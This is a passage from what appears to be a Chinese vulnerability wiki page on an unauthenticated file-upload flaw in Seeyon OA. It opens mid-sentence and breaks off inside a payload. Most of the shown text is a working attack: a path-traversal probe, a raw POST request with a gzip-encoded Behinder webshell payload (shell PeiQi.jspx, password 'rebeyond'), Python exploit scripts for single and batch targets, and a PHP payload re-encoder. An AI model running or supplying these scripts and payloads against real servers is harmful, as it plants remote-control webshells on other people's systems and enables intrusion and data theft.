83\u5927\uff0c\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u5e94\u7528\u8865\u4e01\u66f4\u65b0\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA V8.0 \u81f4\u8fdcOA V7.1\u3001V7.1SP1 \u81f4\u8fdcOA V7.0\u3001V7.0SP1\u3001V7.0SP2\u3001V7.0SP3 \u81f4\u8fdcOA V6.0\u3001V6.1SP1\u3001V6.1SP2 \u81f4\u8fdcOA V5.x \u81f4\u8fdcOA G6 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u901a\u8fc7\u8bf7\u6c42\u5224\u65ad\u662f\u5426\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do \u67e5\u770b\u662f\u5426\u51fa\u73b0\u5982\u4e0a\u56fe\u5f02\u5e38\uff0c\u82e5\u5b58\u5728\u5219\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e \u51fa\u73b0\u5f02\u5e38\uff1ajava.lang.NullPointerException:null \u7136\u540e\u8c03\u7528\u672a\u6388\u6743\u7684\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u4e0a\u4f20webshell\u6587\u4ef6 POC\u8bf7\u6c42\u5305\u5982\u4e0b POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction & managerName=formulaManager & requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate & arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00 \u51b0\u874e3 \u9ed8\u8ba4\u9a6cpass : rebeyond webshell\u5730\u5740: http://xxx.xxx.xxx.xxx/seeyon/PeiQi.jspx \u6210\u529f\u4f1a\u8fd4\u56de { \"message\" : null , \"details\" : null , \"code\" : \"0436821967\" } \u5931\u8d25\u4f1a\u8fd4\u56de { \"message\" : \"\u88ab\u8feb\u4e0b\u7ebf\uff0c\u539f\u56e0\uff1a\u4e0e\u670d\u52a1\u5668\u5931\u53bb\u8fde\u63a5\" , \"code\" : \"-1\" , \"details\" : null } \u4e0a\u4f20\u540e\u8bf7\u6c42webshell\u5730\u5740\uff0c\u8bbf\u95ee\u8fd4\u56de\u51fa\u73b0\u5982\u4e0b\u56fe\u5219\u6210\u529f\u5199\u5165 [!NOTE] \u8bbf\u95ee\u72b6\u6001\u7801\u4e3a 200 \u6210\u529f \u8bbf\u95ee\u72b6\u6001\u7801\u4e3a 404 \u5931\u8d25 \u4f7f\u7528\u51b0\u874e\u8fde\u63a5: rebeyond \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u5355\u4e2a\u76ee\u6807 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url_2 )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"managerMethod=validate&arguments= %1F %C2%8B %08% 00 %00% 00 %00% 00 %00% 0AuTK%C2 %93% C2%A2H %10% 3E%C3%AF%C3%BE%0A%C3 %82% C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB %13% 7Bh_%C2 %88% 28%2A %28% C2%AF%C2%8D%3D %40% 15Ba %15% C2%B0%C3%B2 %10% C3%AC%C2 %98% C3%BF%C2%BE %05% C3 %98% C3 %93% 3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2 %8E %C2%9DC%C2 %95x %C3%9D %3F %C2 %98% C3 %81% 17%C3%A6M%C2%A28%C2%A4%C2%96t3 %2F %C3%8D%C2%BA%C3%AF%C3%A2y%C2 %99% 5C%C2%BC4EqT %3F j%C3 %99% 05E %3E %C2%938Y%C3 %80% C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2 %92% 3E%C2%A5%C2 %9E W%C3 %85% C3%91S%C3%A7%C3%BB%C3%AFL%7B %7E %0B%C2%9D%C3 %82% C3%A9%C2%A3%C2%B8%C2%BF%C2%A3 %26% C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3 %00% C2%91we %3E Q%C3%AB%C3 %95% C3%B8%C2 %8F %C2%9D%C2%9D%C2 %87% C3%B6%C2%A8 %1F %C2%A6I%C3%99y%C3%B8 %09% C3%8B%C3%9C%5DH %03% 0F%C3%A3%C3%9A%C2 %87% C2%9D%C2 %98% C3%9C%C3 %80% 2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6 %25% C2%B5%C2%8CE%C3 %8E Re%C3 %81% 2C.%C3 %96% 5C %12% 402%C3 %8F%01% C2%AF%C3%A7k%C2%A2 %14% C2%AE6%C2 %96% C2 %8F %C2 %83% C2 %97% C3%A2%28. %22% 5B%C2 %93% 7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a %25% C2 %85% C3 %83g %27R%C2%AE%5B%C2%A2 %26% C2 %80% C3%A8 %21% 141gk%C3 %82% C3%952+%C2%96D%C2%9C%01q%5C%C3 %81% 1A%C2 %9F %2C8K %13% 06%C3%B4%3D%5D%C2%A38mx%C3 %93% C3 %8F - %7E%25% C2 %80% C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3 %89e%24% 15%C2%BB%C2%B0%C3%BC %07% C3%B0 %2F %C3 %9F lQ %0F %5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q %12% C2 %95% C3 %942% C2 %95% C2%9B%C2%B48%C3%BA%C2%B6 %19% C2%B0%C2%B6 %21% C2%9CA5%C2%99Q%C2%9D%1B %60% C3%8B%C3%822T%0C%C2%A2L%C2 %97% C3%A7%C2%AD%C3 %9E A%1C %07% 14%C2%A3%C2 %92% C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2 %96% 1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92 %00% C3%BC%C3 %86% C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2 %84G 4 %3E%16% C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C %3E %C2%B6%C3 %98% C2%B2 %28% C2%A5%C2%9Bi%C2 %89% C3 %96% C2%A4%C3%84.%C2 %81% C2%AC3%3D%C2 %8F N %26% C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3 %9E %2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB %40% C3%B0 %15% C2%8A %25% C2 %863% C3%A1 %00% C2 %97% C2%AB%C3 %84% 25%C3%80wn%2C%C2%B2 %0F %C3%BB%C2 %81% 7D%C3%98T%5B%C3 %83% C3%86V%C2%A8%C2 %9F %C2%B7 %07i%60% 21i %048% C3%BD%C3 %96% C3 %94% 00%09Wh%C2%AA%C2 %86e %C2 %94% 03%5B%C3%B3 %11% C3 %94% C2%A4%C3 %94% C2%A9%C3 %8E %C2%A3%3D%C2 %87% C2%AFN%1B%C3%A3%C3%B8%C2%8D %5E%13% C2 %88% C3%A1%1C%C3 %93% C2%BA%C2%AA%C2%81K %14% 2COW%13U%C3 %9F +%C3%B9%C2 %90% C2%85k%1A%C2 %83c %C3%AE%C3%A3%0D%2As%C3%9B %04% C3%BE%C2 %91% C3 %93% C3 %83% 3AV%C2%8D%C3 %93% C2 %85% 23 %3F %C3%81V%C3%A5%C3 %87% 1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3 %96% C3 %88% C2%A7u%C2%BE %40% C3%A5 %27% C3%AB7%7C%C3%AD%3Cr%C2 %89% C3 %8E %C3 %93% C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3 %86% C2%AF_k%23O%C3 %8F T %0E b%C2%AB %12% C3 %8E .k%C3 %93% 7C%2CRY %140% C2%AC %267h% 0Cs%C3 %97% C3 %807% C3%BA6%C3%9D%C3%AB%C3%8AB %09% C3 %959% C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2 %8F tb%C3 %93% 5E%C2 %95% C2 %97% 2B%0CL%1D %03% 7E%C2 %9F %C3%9B%C2%9C%C3 %8E%1E %C2 %89% C3%BE%C3%B6G %0E j%C2%9AN%C2%ADK%C2 %8E 1%C3%B53%C2%A11%C3 %90% C3%B8%C3%A1%C3%8A%C2%8D %14% C3 %962% C2 %84% C2 %90% C3 %86G %C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q %0E E%7D %08i mw%C3%93q%C3 %93% C2 %93% C2%80S%2A%C3 %87% C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF %7F %7C%C2 %9F r %26% C3%8D%C2%A3 %3E A %29% C3%A8O %5E %C2%B4%C3%B9%C2%B7%C3%A1%C3%8C %031% C2%A4%C2 %83% 0E%C3%AFw%3B%C3%A3%C2 %9F %2B%C3%B5%C3%BE%3B%C3 %95% C2%AD%C3 %99% C2%9Dim%5B%C2%A6w %07% C3%AC%C2%B7%C3%B7 %24% 3F%C2%9D %28% 40%C2%B3 %04% 1E%C2%BEt%C2 %8E %C2 %87% C3 %85% C3 %97% C3%A7%C2 %8F K%C3%A2%C3%A3%C2 %9E %C3%A97%0C%C2 %8E z %1F %C3 %81% C3%BFO %17% C3%A08%C3%B5%C2%A8c %3F %C2%BE%C3 %97% 7B%C2 %90% 12%C3 %90% 3B1i%C3%A6d %080e Y%C3%B6 %1E%5E %C2%BB %3F %C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE %17% 1CR%C2%AD%17W %05% 00%00\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url_2 , headers = headers , data = data , verify = False ) test_webshell ( target_url ) def test_webshell ( target_url ): webshell_url = target_url + \"/seeyon/PeiQi.jspx\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 : {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 webshell : {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url , target_url )) print ( \" \\033 [32m[o] webshell\u5730\u5740\uff1a {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u51b0\u874e3\u9ed8\u8ba4\u9a6c pass \uff1arebeyond \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\uff0c\u5199\u5165\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\uff0c\u5199\u5165\u5931\u8d25 {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) \u6587\u4ef6\u7f16\u7801\u811a\u672c, \u81ea\u884c\u8fdb\u884c\u81ea\u5b9a\u4e49\u8c03\u8bd5 <?php $webshell = urldecode ( \"%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00\" ); $webshell = iconv ( \"UTF-8\" , \"ISO-8859-1\" , $webshell ); $webshell = gzdecode ( $webshell ); /* \u81ea\u884c\u66f4\u6539\u811a\u672c\u81ea\u5b9a\u4e49\u4e0a\u4f20\u4f4d\u7f6e,webshell\u540d\u5b57,\u51b0\u874e\u5bc6\u7801 */ $webshell = str_replace ( \"../webapps/seeyon/\" , \"../webapps/seeyon/\" , $webshell ); $webshell = str_replace ( \"PeiQi.jspx\" , \"PeiQi.jspx\" , $webshell ); $webshell = str_replace ( \"e45e329feb5d925b\" , \"e45e329feb5d925b\" , $webshell ); $webshell = gzencode ( $webshell ); $webshell = iconv ( \"ISO-8859-1\" , \"UTF-8\" , $webshell ); $webshell = urlencode ( \" $webshell \" ); echo $webshell ; ?> [!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_1 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url_1 )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"managerMethod=validate&arguments= %1F %C2%8B %08% 00 %00% 00 %00% 00 %00% 0AuTK%C2 %93% C2%A2H %10% 3E%C3%AF%C3%BE%0A%C3 %82% C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB %13% 7Bh_%C2 %88% 28%2A %28% C2%AF%C2%8D%3D %40% 15Ba %15% C2%B0%C3%B2 %10% C3%AC%C2 %98% C3%BF%C2%BE %05% C3 %98% C3 %93% 3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2 %8E %C2%9DC%C2 %95x %C3%9D %3F %C2 %98% C3 %81% 17%C3%A6M%C2%A28%C2%A4%C2%96t3 %2F %C3%8D%C2%BA%C3%AF%C3%A2y%C2 %99% 5C%C2%BC4EqT %3F j%C3 %99% 05E %3E %C2%938Y%C3 %80% C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2 %92% 3E%C2%A5%C2 %9E W%C3 %85% C3%91S%C3%A7%C3%BB%C3%AFL%7B %7E %0B%C2%9D%C3 %82% C3%A9%C2%A3%C2%B8%C2%BF%C2%A3 %26% C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3 %00% C2%91we %3E Q%C3%AB%C3 %95% C3%B8%C2 %8F %C2%9D%C2%9D%C2 %87% C3%B6%C2%A8 %1F %C2%A6I%C3%99y%C3%B8 %09% C3%8B%C3%9C%5DH %03% 0F%C3%A3%C3%9A%C2 %87% C2%9D%C2 %98% C3%9C%C3 %80% 2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6 %25% C2%B5%C2%8CE%C3 %8E Re%C3 %81% 2C.%C3 %96% 5C %12% 